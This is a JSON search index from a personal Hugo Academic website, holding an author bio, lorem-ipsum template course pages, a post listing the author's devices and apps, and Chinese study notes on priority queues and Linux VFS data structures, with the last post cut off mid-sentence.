[{"authors":["admin"],"categories":null,"content":"I am @Terry (Guoze, Tang), a graduate student in the School of Computing at Clemson Universvity. I graduated from Yunnan University Electronic and Information Engineering in 2014. After that, I studied Software Engineering and graduated from University of Science and Technology of China in 03 / 2017. After two years of study, I acquired a comprehensive knowledge of computer hardware and software. I was interested in embedded systems design. And I gained a lot, not only on specialized knowledge but also a scientific way of thinking.\n","date":1549324800,"expirydate":-62135596800,"kind":"taxonomy","lang":"en","lastmod":1567641600,"objectID":"2525497d367e79493fd32b198b28f040","permalink":"http://www.guozet.me/author/Terry-Tang/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/Terry-Tang/","section":"authors","summary":"I am @Terry (Guoze, Tang), a graduate student in the School of Computing at Clemson Universvity. I graduated from Yunnan University Electronic and Information Engineering in 2014. After that, I studied Software Engineering and graduated from University of Science and Technology of China in 03 / 2017.","tags":null,"title":"Terry Tang","type":"authors"},{"authors":null,"categories":null,"content":"Flexibility This feature can be used for publishing content such as:\n Online courses Project or software documentation Tutorials  The courses folder may be renamed. For example, we can rename it to docs for software/project documentation or tutorials for creating an online course.\nDelete tutorials To remove these pages, delete the courses folder and see below to delete the associated menu link.\nUpdate site menu After renaming or deleting the courses folder, you may wish to update any [[main]] menu links to it by editing your menu configuration at config/_default/menus.toml.\nFor example, if you delete this folder, you can remove the following from your menu configuration:\n[[main]] name = \u0026quot;Courses\u0026quot; url = \u0026quot;courses/\u0026quot; weight = 50  Or, if you are creating a software documentation site, you can rename the courses folder to docs and update the associated Courses menu configuration to:\n[[main]] name = \u0026quot;Docs\u0026quot; url = \u0026quot;docs/\u0026quot; weight = 50  Update the docs menu If you use the docs layout, note that the name of the menu in the front matter should be in the form [menu.X] where X is the folder name. Hence, if you rename the courses/example/ folder, you should also rename the menu definitions in the front matter of files within courses/example/ from [menu.example] to [menu.\u0026lt;NewFolderName\u0026gt;].\n","date":1536451200,"expirydate":-62135596800,"kind":"section","lang":"en","lastmod":1536451200,"objectID":"59c3ce8e202293146a8a934d37a4070b","permalink":"http://www.guozet.me/courses/example/","publishdate":"2018-09-09T00:00:00Z","relpermalink":"/courses/example/","section":"courses","summary":"Learn how to use Academic's docs layout for publishing online courses, software documentation, and tutorials.","tags":null,"title":"Overview","type":"docs"},{"authors":null,"categories":null,"content":"In this tutorial, I\u0026rsquo;ll share my top 10 tips for getting started with Academic:\nTip 1 Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis posuere tellus ac convallis placerat. Proin tincidunt magna sed ex sollicitudin condimentum. Sed ac faucibus dolor, scelerisque sollicitudin nisi. Cras purus urna, suscipit quis sapien eu, pulvinar tempor diam. Quisque risus orci, mollis id ante sit amet, gravida egestas nisl. Sed ac tempus magna. Proin in dui enim. Donec condimentum, sem id dapibus fringilla, tellus enim condimentum arcu, nec volutpat est felis vel metus. Vestibulum sit amet erat at nulla eleifend gravida.\nNullam vel molestie justo. Curabitur vitae efficitur leo. In hac habitasse platea dictumst. Sed pulvinar mauris dui, eget varius purus congue ac. Nulla euismod, lorem vel elementum dapibus, nunc justo porta mi, sed tempus est est vel tellus. Nam et enim eleifend, laoreet sem sit amet, elementum sem. Morbi ut leo congue, maximus velit ut, finibus arcu. In et libero cursus, rutrum risus non, molestie leo. Nullam congue quam et volutpat malesuada. Sed risus tortor, pulvinar et dictum nec, sodales non mi. Phasellus lacinia commodo laoreet. Nam mollis, erat in feugiat consectetur, purus eros egestas tellus, in auctor urna odio at nibh. Mauris imperdiet nisi ac magna convallis, at rhoncus ligula cursus.\nCras aliquam rhoncus ipsum, in hendrerit nunc mattis vitae. Duis vitae efficitur metus, ac tempus leo. Cras nec fringilla lacus. Quisque sit amet risus at ipsum pharetra commodo. Sed aliquam mauris at consequat eleifend. Praesent porta, augue sed viverra bibendum, neque ante euismod ante, in vehicula justo lorem ac eros. Suspendisse augue libero, venenatis eget tincidunt ut, malesuada at lorem. Donec vitae bibendum arcu. Aenean maximus nulla non pretium iaculis. Quisque imperdiet, nulla in pulvinar aliquet, velit quam ultrices quam, sit amet fringilla leo sem vel nunc. Mauris in lacinia lacus.\nSuspendisse a tincidunt lacus. Curabitur at urna sagittis, dictum ante sit amet, euismod magna. Sed rutrum massa id tortor commodo, vitae elementum turpis tempus. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean purus turpis, venenatis a ullamcorper nec, tincidunt et massa. Integer posuere quam rutrum arcu vehicula imperdiet. Mauris ullamcorper quam vitae purus congue, quis euismod magna eleifend. Vestibulum semper vel augue eget tincidunt. Fusce eget justo sodales, dapibus odio eu, ultrices lorem. Duis condimentum lorem id eros commodo, in facilisis mauris scelerisque. Morbi sed auctor leo. Nullam volutpat a lacus quis pharetra. Nulla congue rutrum magna a ornare.\nAliquam in turpis accumsan, malesuada nibh ut, hendrerit justo. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Quisque sed erat nec justo posuere suscipit. Donec ut efficitur arcu, in malesuada neque. Nunc dignissim nisl massa, id vulputate nunc pretium nec. Quisque eget urna in risus suscipit ultricies. Pellentesque odio odio, tincidunt in eleifend sed, posuere a diam. Nam gravida nisl convallis semper elementum. Morbi vitae felis faucibus, vulputate orci placerat, aliquet nisi. Aliquam erat volutpat. Maecenas sagittis pulvinar purus, sed porta quam laoreet at.\nTip 2 Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis posuere tellus ac convallis placerat. Proin tincidunt magna sed ex sollicitudin condimentum. Sed ac faucibus dolor, scelerisque sollicitudin nisi. Cras purus urna, suscipit quis sapien eu, pulvinar tempor diam. Quisque risus orci, mollis id ante sit amet, gravida egestas nisl. Sed ac tempus magna. Proin in dui enim. Donec condimentum, sem id dapibus fringilla, tellus enim condimentum arcu, nec volutpat est felis vel metus. Vestibulum sit amet erat at nulla eleifend gravida.\nNullam vel molestie justo. Curabitur vitae efficitur leo. In hac habitasse platea dictumst. Sed pulvinar mauris dui, eget varius purus congue ac. Nulla euismod, lorem vel elementum dapibus, nunc justo porta mi, sed tempus est est vel tellus. Nam et enim eleifend, laoreet sem sit amet, elementum sem. Morbi ut leo congue, maximus velit ut, finibus arcu. In et libero cursus, rutrum risus non, molestie leo. Nullam congue quam et volutpat malesuada. Sed risus tortor, pulvinar et dictum nec, sodales non mi. Phasellus lacinia commodo laoreet. Nam mollis, erat in feugiat consectetur, purus eros egestas tellus, in auctor urna odio at nibh. Mauris imperdiet nisi ac magna convallis, at rhoncus ligula cursus.\nCras aliquam rhoncus ipsum, in hendrerit nunc mattis vitae. Duis vitae efficitur metus, ac tempus leo. Cras nec fringilla lacus. Quisque sit amet risus at ipsum pharetra commodo. Sed aliquam mauris at consequat eleifend. Praesent porta, augue sed viverra bibendum, neque ante euismod ante, in vehicula justo lorem ac eros. Suspendisse augue libero, venenatis eget tincidunt ut, malesuada at lorem. Donec vitae bibendum arcu. Aenean maximus nulla non pretium iaculis. Quisque imperdiet, nulla in pulvinar aliquet, velit quam ultrices quam, sit amet fringilla leo sem vel nunc. Mauris in lacinia lacus.\nSuspendisse a tincidunt lacus. Curabitur at urna sagittis, dictum ante sit amet, euismod magna. Sed rutrum massa id tortor commodo, vitae elementum turpis tempus. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean purus turpis, venenatis a ullamcorper nec, tincidunt et massa. Integer posuere quam rutrum arcu vehicula imperdiet. Mauris ullamcorper quam vitae purus congue, quis euismod magna eleifend. Vestibulum semper vel augue eget tincidunt. Fusce eget justo sodales, dapibus odio eu, ultrices lorem. Duis condimentum lorem id eros commodo, in facilisis mauris scelerisque. Morbi sed auctor leo. Nullam volutpat a lacus quis pharetra. Nulla congue rutrum magna a ornare.\nAliquam in turpis accumsan, malesuada nibh ut, hendrerit justo. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Quisque sed erat nec justo posuere suscipit. Donec ut efficitur arcu, in malesuada neque. Nunc dignissim nisl massa, id vulputate nunc pretium nec. Quisque eget urna in risus suscipit ultricies. Pellentesque odio odio, tincidunt in eleifend sed, posuere a diam. Nam gravida nisl convallis semper elementum. Morbi vitae felis faucibus, vulputate orci placerat, aliquet nisi. Aliquam erat volutpat. Maecenas sagittis pulvinar purus, sed porta quam laoreet at.\n","date":1557010800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1557010800,"objectID":"74533bae41439377bd30f645c4677a27","permalink":"http://www.guozet.me/courses/example/example1/","publishdate":"2019-05-05T00:00:00+01:00","relpermalink":"/courses/example/example1/","section":"courses","summary":"In this tutorial, I\u0026rsquo;ll share my top 10 tips for getting started with Academic:\nTip 1 Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis posuere tellus ac convallis placerat. Proin tincidunt magna sed ex sollicitudin condimentum.","tags":null,"title":"Example Page 1","type":"docs"},{"authors":null,"categories":null,"content":"Here are some more tips for getting started with Academic:\nTip 3 Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis posuere tellus ac convallis placerat. Proin tincidunt magna sed ex sollicitudin condimentum. Sed ac faucibus dolor, scelerisque sollicitudin nisi. Cras purus urna, suscipit quis sapien eu, pulvinar tempor diam. Quisque risus orci, mollis id ante sit amet, gravida egestas nisl. Sed ac tempus magna. Proin in dui enim. Donec condimentum, sem id dapibus fringilla, tellus enim condimentum arcu, nec volutpat est felis vel metus. Vestibulum sit amet erat at nulla eleifend gravida.\nNullam vel molestie justo. Curabitur vitae efficitur leo. In hac habitasse platea dictumst. Sed pulvinar mauris dui, eget varius purus congue ac. Nulla euismod, lorem vel elementum dapibus, nunc justo porta mi, sed tempus est est vel tellus. Nam et enim eleifend, laoreet sem sit amet, elementum sem. Morbi ut leo congue, maximus velit ut, finibus arcu. In et libero cursus, rutrum risus non, molestie leo. Nullam congue quam et volutpat malesuada. Sed risus tortor, pulvinar et dictum nec, sodales non mi. Phasellus lacinia commodo laoreet. Nam mollis, erat in feugiat consectetur, purus eros egestas tellus, in auctor urna odio at nibh. Mauris imperdiet nisi ac magna convallis, at rhoncus ligula cursus.\nCras aliquam rhoncus ipsum, in hendrerit nunc mattis vitae. Duis vitae efficitur metus, ac tempus leo. Cras nec fringilla lacus. Quisque sit amet risus at ipsum pharetra commodo. Sed aliquam mauris at consequat eleifend. Praesent porta, augue sed viverra bibendum, neque ante euismod ante, in vehicula justo lorem ac eros. Suspendisse augue libero, venenatis eget tincidunt ut, malesuada at lorem. Donec vitae bibendum arcu. Aenean maximus nulla non pretium iaculis. Quisque imperdiet, nulla in pulvinar aliquet, velit quam ultrices quam, sit amet fringilla leo sem vel nunc. Mauris in lacinia lacus.\nSuspendisse a tincidunt lacus. Curabitur at urna sagittis, dictum ante sit amet, euismod magna. Sed rutrum massa id tortor commodo, vitae elementum turpis tempus. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean purus turpis, venenatis a ullamcorper nec, tincidunt et massa. Integer posuere quam rutrum arcu vehicula imperdiet. Mauris ullamcorper quam vitae purus congue, quis euismod magna eleifend. Vestibulum semper vel augue eget tincidunt. Fusce eget justo sodales, dapibus odio eu, ultrices lorem. Duis condimentum lorem id eros commodo, in facilisis mauris scelerisque. Morbi sed auctor leo. Nullam volutpat a lacus quis pharetra. Nulla congue rutrum magna a ornare.\nAliquam in turpis accumsan, malesuada nibh ut, hendrerit justo. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Quisque sed erat nec justo posuere suscipit. Donec ut efficitur arcu, in malesuada neque. Nunc dignissim nisl massa, id vulputate nunc pretium nec. Quisque eget urna in risus suscipit ultricies. Pellentesque odio odio, tincidunt in eleifend sed, posuere a diam. Nam gravida nisl convallis semper elementum. Morbi vitae felis faucibus, vulputate orci placerat, aliquet nisi. Aliquam erat volutpat. Maecenas sagittis pulvinar purus, sed porta quam laoreet at.\nTip 4 Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis posuere tellus ac convallis placerat. Proin tincidunt magna sed ex sollicitudin condimentum. Sed ac faucibus dolor, scelerisque sollicitudin nisi. Cras purus urna, suscipit quis sapien eu, pulvinar tempor diam. Quisque risus orci, mollis id ante sit amet, gravida egestas nisl. Sed ac tempus magna. Proin in dui enim. Donec condimentum, sem id dapibus fringilla, tellus enim condimentum arcu, nec volutpat est felis vel metus. Vestibulum sit amet erat at nulla eleifend gravida.\nNullam vel molestie justo. Curabitur vitae efficitur leo. In hac habitasse platea dictumst. Sed pulvinar mauris dui, eget varius purus congue ac. Nulla euismod, lorem vel elementum dapibus, nunc justo porta mi, sed tempus est est vel tellus. Nam et enim eleifend, laoreet sem sit amet, elementum sem. Morbi ut leo congue, maximus velit ut, finibus arcu. In et libero cursus, rutrum risus non, molestie leo. Nullam congue quam et volutpat malesuada. Sed risus tortor, pulvinar et dictum nec, sodales non mi. Phasellus lacinia commodo laoreet. Nam mollis, erat in feugiat consectetur, purus eros egestas tellus, in auctor urna odio at nibh. Mauris imperdiet nisi ac magna convallis, at rhoncus ligula cursus.\nCras aliquam rhoncus ipsum, in hendrerit nunc mattis vitae. Duis vitae efficitur metus, ac tempus leo. Cras nec fringilla lacus. Quisque sit amet risus at ipsum pharetra commodo. Sed aliquam mauris at consequat eleifend. Praesent porta, augue sed viverra bibendum, neque ante euismod ante, in vehicula justo lorem ac eros. Suspendisse augue libero, venenatis eget tincidunt ut, malesuada at lorem. Donec vitae bibendum arcu. Aenean maximus nulla non pretium iaculis. Quisque imperdiet, nulla in pulvinar aliquet, velit quam ultrices quam, sit amet fringilla leo sem vel nunc. Mauris in lacinia lacus.\nSuspendisse a tincidunt lacus. Curabitur at urna sagittis, dictum ante sit amet, euismod magna. Sed rutrum massa id tortor commodo, vitae elementum turpis tempus. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean purus turpis, venenatis a ullamcorper nec, tincidunt et massa. Integer posuere quam rutrum arcu vehicula imperdiet. Mauris ullamcorper quam vitae purus congue, quis euismod magna eleifend. Vestibulum semper vel augue eget tincidunt. Fusce eget justo sodales, dapibus odio eu, ultrices lorem. Duis condimentum lorem id eros commodo, in facilisis mauris scelerisque. Morbi sed auctor leo. Nullam volutpat a lacus quis pharetra. Nulla congue rutrum magna a ornare.\nAliquam in turpis accumsan, malesuada nibh ut, hendrerit justo. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Quisque sed erat nec justo posuere suscipit. Donec ut efficitur arcu, in malesuada neque. Nunc dignissim nisl massa, id vulputate nunc pretium nec. Quisque eget urna in risus suscipit ultricies. Pellentesque odio odio, tincidunt in eleifend sed, posuere a diam. Nam gravida nisl convallis semper elementum. Morbi vitae felis faucibus, vulputate orci placerat, aliquet nisi. Aliquam erat volutpat. Maecenas sagittis pulvinar purus, sed porta quam laoreet at.\n","date":1557010800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1557010800,"objectID":"1c2b5a11257c768c90d5050637d77d6a","permalink":"http://www.guozet.me/courses/example/example2/","publishdate":"2019-05-05T00:00:00+01:00","relpermalink":"/courses/example/example2/","section":"courses","summary":"Here are some more tips for getting started with Academic:\nTip 3 Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis posuere tellus ac convallis placerat. Proin tincidunt magna sed ex sollicitudin condimentum.","tags":null,"title":"Example Page 2","type":"docs"},{"authors":null,"categories":[["Notes"]],"content":"  Hardware   Laptop  Mobile Phone  Accessories    Software   Laptop Apps  iOS Apps  Cloud-based Apps    Hardware Laptop Acer R11 Chromebook(11.5 inch, 2018)\nInformation:\n 2018 year 11.6\u0026rdquo; HD (1366 x 768) 16:9 IPS 4 GB, DDR3L SDRAM, 32 GB SSD Intel® Celeron® N3150 processor Quad-core 1.60 GHz System: GalliumOS(xUbuntu)  Mobile Phone iPhone 7 Plus(128GB)\nI like the iOS system. It\u0026rsquo;s simple and good for me to keep touch with my friends.\nAccessories iPad Pro(10.5 inch, 2017)\nThis iPad is my favorites produce. I usually use it to do somethings like follow:\n Reading PDF files Write some post by markdown  Software Laptop Apps  Chrome VS code Electron-SSR AnyConnect  iOS Apps Security\u0026amp;Network\n  Duo Mobile:Secure Two-Factor Authentication App. Secure access to work and personal, cloud and on-premises apps with one simple app.  Lastpass:A freemium password manager that stores encrypted passwords online. VPN: AnyConnect, Quantumult  Productivity\n IFTTT Shortcuts Scannable Dropbox OfficeSuite  Study\n GoodNotes Eudic Aboboo Reeder  Health\n keep MyFitnesspal YUNMAI  Finance\n  Mint: Record all the cost from my bank.(We bring together all of your accounts, bills and more, so you can conveniently manage your finances from one dashboard.) 随手记:Set the budget and record each cost by myself.  Cloud-based Apps   IFTTT: Setup automation between apps and service.  AWS(Amazon Web services): Cloud computing Github Travis CI  ","date":1573767772,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1573767772,"objectID":"1660870433355016a2f979972a510ee1","permalink":"http://www.guozet.me/post/My-workbench-and-Productivity-tools/","publishdate":"2019-11-14T21:42:52Z","relpermalink":"/post/My-workbench-and-Productivity-tools/","section":"post","summary":"Hardware Laptop Mobile Phone Accessories Software Laptop Apps iOS Apps Cloud-based Apps Hardware Laptop Acer R11 Chromebook(11.5 inch, 2018) Information: 2018 year 11.6\u0026rdquo; HD (1366 x 768) 16:9 IPS 4","tags":"Node","title":"My workbench and Productivity tools","type":"post"},{"authors":null,"categories":null,"content":"Academic is designed to give technical content creators a seamless experience. You can focus on the content and Academic handles the rest.\nHighlight your code snippets, take notes on math classes, and draw diagrams from textual representation.\nOn this page, you\u0026rsquo;ll find some examples of the types of technical content that can be rendered with Academic.\nExamples Code Academic supports a Markdown extension for highlighting code syntax. You can enable this feature by toggling the highlight option in your config/_default/params.toml file.\n```python import pandas as pd data = pd.read_csv(\u0026quot;data.csv\u0026quot;) data.head() ```  renders as\nimport pandas as pd data = pd.read_csv(\u0026quot;data.csv\u0026quot;) data.head()  Math Academic supports a Markdown extension for $\\LaTeX$ math. You can enable this feature by toggling the math option in your config/_default/params.toml file.\nTo render inline or block math, wrap your LaTeX math with $...$ or $$...$$, respectively.\nExample math block:\n$$\\gamma_{n} = \\frac{ \\left | \\left (\\mathbf x_{n} - \\mathbf x_{n-1} \\right )^T \\left [\\nabla F (\\mathbf x_{n}) - \\nabla F (\\mathbf x_{n-1}) \\right ] \\right |} {\\left \\|\\nabla F(\\mathbf{x}_{n}) - \\nabla F(\\mathbf{x}_{n-1}) \\right \\|^2}$$  renders as\n$$\\gamma_{n} = \\frac{ \\left | \\left (\\mathbf x_{n} - \\mathbf x_{n-1} \\right )^T \\left [\\nabla F (\\mathbf x_{n}) - \\nabla F (\\mathbf x_{n-1}) \\right ] \\right |}{\\left |\\nabla F(\\mathbf{x}_{n}) - \\nabla F(\\mathbf{x}_{n-1}) \\right |^2}$$\nExample inline math $\\nabla F(\\mathbf{x}_{n})$ renders as $\\nabla F(\\mathbf{x}_{n})$.\nExample multi-line math using the \\\\\\\\ math linebreak:\n$$f(k;p_0^*) = \\begin{cases} p_0^* \u0026amp; \\text{if }k=1, \\\\\\\\ 1-p_0^* \u0026amp; \\text {if }k=0.\\end{cases}$$  renders as\n$$f(k;p_0^*) = \\begin{cases} p_0^* \u0026amp; \\text{if }k=1, \\\\\n1-p_0^* \u0026amp; \\text {if }k=0.\\end{cases}$$\nDiagrams Academic supports a Markdown extension for diagrams. You can enable this feature by toggling the diagram option in your config/_default/params.toml file or by adding diagram: true to your page front matter.\nAn example flowchart:\n```mermaid graph TD A[Hard] --\u0026gt;|Text| B(Round) B --\u0026gt; C{Decision} C --\u0026gt;|One| D[Result 1] C --\u0026gt;|Two| E[Result 2] ```  renders as\ngraph TD A[Hard] --\u0026gt;|Text| B(Round) B --\u0026gt; C{Decision} C --\u0026gt;|One| D[Result 1] C --\u0026gt;|Two| E[Result 2]  An example sequence diagram:\n```mermaid sequenceDiagram Alice-\u0026gt;\u0026gt;John: Hello John, how are you? loop Healthcheck John-\u0026gt;\u0026gt;John: Fight against hypochondria end Note right of John: Rational thoughts! John--\u0026gt;\u0026gt;Alice: Great! John-\u0026gt;\u0026gt;Bob: How about you? Bob--\u0026gt;\u0026gt;John: Jolly good! ```  renders as\nsequenceDiagram Alice-\u0026gt;\u0026gt;John: Hello John, how are you? loop Healthcheck John-\u0026gt;\u0026gt;John: Fight against hypochondria end Note right of John: Rational thoughts! John--\u0026gt;\u0026gt;Alice: Great! John-\u0026gt;\u0026gt;Bob: How about you? Bob--\u0026gt;\u0026gt;John: Jolly good!  An example Gantt diagram:\n```mermaid gantt section Section Completed :done, des1, 2014-01-06,2014-01-08 Active :active, des2, 2014-01-07, 3d Parallel 1 : des3, after des1, 1d Parallel 2 : des4, after des1, 1d Parallel 3 : des5, after des3, 1d Parallel 4 : des6, after des4, 1d ```  renders as\ngantt section Section Completed :done, des1, 2014-01-06,2014-01-08 Active :active, des2, 2014-01-07, 3d Parallel 1 : des3, after des1, 1d Parallel 2 : des4, after des1, 1d Parallel 3 : des5, after des3, 1d Parallel 4 : des6, after des4, 1d  An example class diagram:\n```mermaid classDiagram Class01 \u0026lt;|-- AveryLongClass : Cool \u0026lt;\u0026lt;interface\u0026gt;\u0026gt; Class01 Class09 --\u0026gt; C2 : Where am i? Class09 --* C3 Class09 --|\u0026gt; Class07 Class07 : equals() Class07 : Object[] elementData Class01 : size() Class01 : int chimp Class01 : int gorilla class Class10 { \u0026lt;\u0026lt;service\u0026gt;\u0026gt; int id size() } ```  renders as\nclassDiagram Class01 \u0026lt;|-- AveryLongClass : Cool \u0026lt;\u0026lt;interface\u0026gt;\u0026gt; Class01 Class09 --\u0026gt; C2 : Where am i? Class09 --* C3 Class09 --|\u0026gt; Class07 Class07 : equals() Class07 : Object[] elementData Class01 : size() Class01 : int chimp Class01 : int gorilla class Class10 { \u0026lt;\u0026lt;service\u0026gt;\u0026gt; int id size() }  An example state diagram:\n```mermaid stateDiagram [*] --\u0026gt; Still Still --\u0026gt; [*] Still --\u0026gt; Moving Moving --\u0026gt; Still Moving --\u0026gt; Crash Crash --\u0026gt; [*] ```  renders as\nstateDiagram [*] --\u0026gt; Still Still --\u0026gt; [*] Still --\u0026gt; Moving Moving --\u0026gt; Still Moving --\u0026gt; Crash Crash --\u0026gt; [*]  Todo lists You can even write your todo lists in Academic too:\n- [x] Write math example - [x] Write diagram example - [ ] Do something else  renders as\n Write math example Write diagram example Do something else  Tables Represent your data in tables:\n| First Header | Second Header | | ------------- | ------------- | | Content Cell | Content Cell | | Content Cell | Content Cell |  renders as\n   First Header Second Header     Content Cell Content Cell   Content Cell Content Cell    Asides Academic supports a shortcode for asides, also referred to as notices, hints, or alerts. By wrapping a paragraph in {{% alert note %}} ... {{% /alert %}}, it will render as an aside.\n{{% alert note %}} A Markdown aside is useful for displaying notices, hints, or definitions to your readers. {{% /alert %}}  renders as\n A Markdown aside is useful for displaying notices, hints, or definitions to your readers.   Icons Academic enables you to use a wide range of icons from Font Awesome and Academicons in addition to emojis.\nHere are some examples using the icon shortcode to render icons:\n{{\u0026lt; icon name=\u0026quot;terminal\u0026quot; pack=\u0026quot;fas\u0026quot; \u0026gt;}} Terminal {{\u0026lt; icon name=\u0026quot;python\u0026quot; pack=\u0026quot;fab\u0026quot; \u0026gt;}} Python {{\u0026lt; icon name=\u0026quot;r-project\u0026quot; pack=\u0026quot;fab\u0026quot; \u0026gt;}} R  renders as\n  Terminal\n Python\n R\nDid you find this page helpful? Consider sharing it 🙌 ","date":1562889600,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1562889600,"objectID":"07e02bccc368a192a0c76c44918396c3","permalink":"http://www.guozet.me/post/writing-technical-content/","publishdate":"2019-07-12T00:00:00Z","relpermalink":"/post/writing-technical-content/","section":"post","summary":"Academic is designed to give technical content creators a seamless experience. You can focus on the content and Academic handles the rest.\nHighlight your code snippets, take notes on math classes, and draw diagrams from textual representation.","tags":null,"title":"Writing technical content in Academic","type":"post"},{"authors":null,"categories":[["Algorithm"]],"content":"优先级队列 优先级队列：队列中的元素带有优先级，元素按照优先级不同处于队列中的不同位置．\n 简单的 FIFO 队列，元素的位置与元素被加入进去时候的位置相同．优先级队列中，元素具有最高优先级（通常定义为具有最小的 key 值）的元素总是先从队列中出来．\n 使用场景：  任务调度: 操作系统中的进程调度就是使用优先级队列，有些进程优先级就是要高于其他进程（例如接电话优先级比玩游戏高） 排序： 我们将元素插入到一个 priority queue之后，元素在优先级队列里就已经是排好序的了(时间复杂度：　$O(n \\log n)$) 使用在复杂的算法中：　比如 Dijksta\u0026rsquo;s Shortest path algorithm 算法中使用 priority queue 来保持没一个时刻的路径长度  支持的操作 所有的优先级队列都支持的操作：\n insert(e,k) : Insert a new element e with key k (插入一个优先级数值为key的元素e, key值越小优先级越大) remove-min: 删除并返回key值最小的元素(优先级最大，也就是在队首的元素)  特殊操作：\n Decrease-key(e, k）:减少优先级队列中 key 为 e 的元素的数值(减少量为 k 值) Increase-key(e, k）:增加优先级队列中 key 为 e 的元素的数值(增加量为 k 值) Delete(e): 在优先级队列中去掉 key　值为 e　的元素 Find-min: 返回指向优先级队列中的最小值的指针  Decrease-key(e, k）常常被使用，比如迪杰斯特拉算法中需要经常使用，因为网络结点的权值一旦发生变化，那么就需要重新更新一边优先级队列\n上面的几个操作是可以相互进行转换的：\n 如果给我们 Insert(e, k) 和　delete(e) 操作，我们可以通过这两个操作实现　increase-key　和　decrease-key　操作 如果给我们 increase-key　和　decrease-key　操作操作，我们可以通过这两个操作实现　delete(e) 操作 如果给我们 find-min　和　delete　操作操作，我们可以通过这两个操作实现　remove-min 操作 如果给我们 remove-min　和　insert　操作操作，我们可以通过这两个操作实现　find-min 操作   ","date":1556827913,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1556827913,"objectID":"4ad0ef188ac95dc180f33409ca55ce6e","permalink":"http://www.guozet.me/post/Algorithm-Priority-Queue/","publishdate":"2019-05-02T20:11:53Z","relpermalink":"/post/Algorithm-Priority-Queue/","section":"post","summary":"优先级队列 优先级队列：队列中的元素带有优先级，元素按照优先级","tags":"Node","title":"算法分析与设计－优先级队列","type":"post"},{"authors":null,"categories":[["Linux"]],"content":"VFS 文件系统 VFS 是一个软件层,用来处理与 Unix/Linux 标准文件系统相关的所有系统调用。是用户应用程序与文件系统实现之间的抽象层,VFS 能为各种文件系统提供一个通用的、统一的接口。(作用)\nVFS 中描述各对象的数据结构:\n 超级块对象 super_block; 索引节点对象 inode; 文件对象 file; 目录项对象 dentry。  超级块对象(super block) 超级块对象描述一个文件系统的信息;对于每个具体的文件系统来说,都有各自的超级块,如 Ext2 超级块,并被存放在磁盘特定扇区上。当内核对一个具体文件系统进行 mount 安装时,调用文件系统提供的函数为其分配一个 VFS 超级块,并从此判读取具体文件系统超级块中的信息填充进来。\nVFS 超级块是各个具体文件系统安装时才建立的,并在这些具体文件系统卸载时被自动删除,故 VFS 超级块仅存于主存中\n具体文件系统的 VFS 超级块对象何时被创建?如何被创建?\n在挂载的时候被创建,创建的方式是 get_sb 和 kill_sb 分别是在挂载(mount)和卸载(unmount)文件系统实例时会被调用的方法。VFS 通过 get_sb() 函数读取超级块,通过 kill_sb() 函数删除超级块。\n文件系统被挂载时该文件系统必须是注册过的原因?\n在挂载的时候会检查该文件系统类型是不是已经注册过的文件系统的类型,如果是,则在系统中找到对应的文件系统的相关数据结构,用来填充 VFS 的超级块对象。\n每个文件系统都有一个初始化函数,他用于向 VFS 注册,即填写有 file_systems 指向的文件系统注册表数据结构 file_system_type。每一个文件系统类型在注册表中有一个登记项,记录了该文件系统的类型名,文件系统特性,指向对应的 VFS 数据块读取函数的地址及已注册项的链指针等。当装入一个文件系统时,应首先向内核注册该文件及其类型,当卸载一个文件系统时,应向内核申请注销该系 统及类型。文件系统类型的注册反映在以 file_systems 为链表头,以 file_system_type 为节点的链表中。链表的每一个 file_system_type 节点描述了一个已注册的文件系统类型。\n索引结点对象(inode) Inode 对象内包含了内核在操作文件或目录时需要的全部信息,文件名可以更改,但 inode 对文件是唯一的, 且随文件的存在而存在。一个 Inode 代表文件系统中的一个文件,它可以是设备或管道这类特殊文件,故 Inode 中会包含特殊的项。VFS 把每个目录看作一个文件,如在路径/tmp/test 中,tmp 和 test 都是文件, tmp 是目录文件,而 test 是普通文件; tmp 和 test 都有一个 inode 对象表示。每一个文件除了有一个 inode 数据结构外,还有一个 dentry 数据结构与之关联,该结构中的 d_inode 指针指向相应的 inode 结构。\n文件对象(file) 文件对象在磁盘上没有映像,在文件被打开时创建由一个 file 结构组成。文件对象中的信息主要是文件指针,即文件中当前的位置,下一个操作将在该位置发生。file 结构除保存文件当前位置外,还把指向该文件 inode 的指针放在其中,并形成一个双项链表,称系统打开文件表.\n目录项对象(dentry) Dentry 数据结构可以加快对文件的快速定位,改进文件系统的效率。Dentry 描述文件的逻辑属性,它在磁盘上没有对应的映像; inode 结构记录文件的物理属性,在磁盘上有对应的映像.\n 与进程有关的文件系统的数据结构及作用(Files_struct, fs_struct) 用户打开文件相关信息 files_struct 系统打开表信息\n进程的当前工作目录与根目录相关信息 fs_struct Open 的执行过程 读写文件之前必须先打开文件。在文件被打开的过程中,要根据给定的文件路径名搜索目录结构。在内存,常常缓存部分目录结构以便加速目录操作。一旦文件被找到,文件的 FCB 被复制到内存里的系统打开文件表里。该表不仅存储 FCB,还记录打开该文件的进程数。接着,在进程打开文件表里创建一个指针字段,指向系统打开文件表里相应的表项。\n打开文件系统调用返回指向进程打开文件表相应项的指针,以后文件的操作都通过这个指针进行。在 UNIX 系统,打开文件系统调用返回的是文件描述符.\n 注意:在 linux 中文件控制块为 inode 项\n 当进程关闭文件时,相应的进程打开文件表项被删除,相应的系统打开文件表项里的文件打开次数减一。当所有打开该文件的进程都关闭该文件时,已修改的文件信息被写回磁盘,相应的系统打开文件表项被删除。\n实际上,open 